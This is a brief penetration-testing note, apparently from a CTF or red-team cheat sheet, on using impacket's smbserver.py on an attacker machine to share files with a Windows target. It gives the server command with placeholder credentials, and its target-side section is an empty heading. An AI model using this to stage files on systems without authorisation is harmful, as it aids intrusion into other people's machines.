
We can use an SMB server to copy files into a windows box from our attacker's machine


#### On the attacker's end

Create an SMB share in the folder where your sharable files are stored

```python
smbserver.py <share_name> <share_path> -ts -smb2support -username any -password any
```



#### On the target machine

